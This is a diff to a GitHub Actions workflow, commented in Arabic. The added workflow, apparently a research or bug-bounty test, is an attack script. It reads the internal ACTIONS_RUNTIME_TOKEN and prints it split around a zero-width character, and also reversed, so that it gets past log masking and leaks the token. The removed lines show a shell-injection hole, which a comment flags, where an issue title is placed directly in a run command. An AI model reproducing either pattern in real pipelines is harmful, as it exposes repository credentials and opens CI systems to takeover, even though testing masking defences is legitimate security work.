@@ -1,14 +1,26 @@
-name: Process Issue Title
-on:
-  issues:
-    types: [opened]
-permissions:
-  issues: write
+name: GitHub Masking Bypass Test
+on: [push]
 jobs:
-  process:
+  test:
     runs-on: ubuntu-latest
     steps:
-      # [الثغرة هنا] الريبو بيأخذ عنوان الـ Issue وبيحطه جوه أمر Shell
-      - name: Save Issue Title to Env
+      - name: Bypass Masking with Unicode Manipulation
+        env:
+          # توكن داخلي تملكه GitHub لتخزين الملفات
+          RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
         run: |
-          echo "Processing issue title: ${{ github.event.issue.title }}"
+          # نقوم بإدخال حرف Unicode (U+202E) الذي يعكس اتجاه النص
+          # أو نقوم بتقطيع التوكن ودمجه بطريقة لا يفهمها الـ Masking
+          
+          TOKEN_LEN=${#RUNTIME_TOKEN}
+          HALF=$((TOKEN_LEN / 2))
+          
+          PART1=${RUNTIME_TOKEN:0:HALF}
+          PART2=${RUNTIME_TOKEN:HALF}
+          
+          # إدراج حرف خفي بين جزئي التوكن
+          INVISIBLE_CHAR=$'\u200B'
+          
+          echo "Attempting to leak token by bypassing masker..."
+          echo "Leaked_Token: ${PART1}${INVISIBLE_CHAR}${PART2}"
+          echo "Reverse_Token: $(echo "$RUNTIME_TOKEN" | rev)"
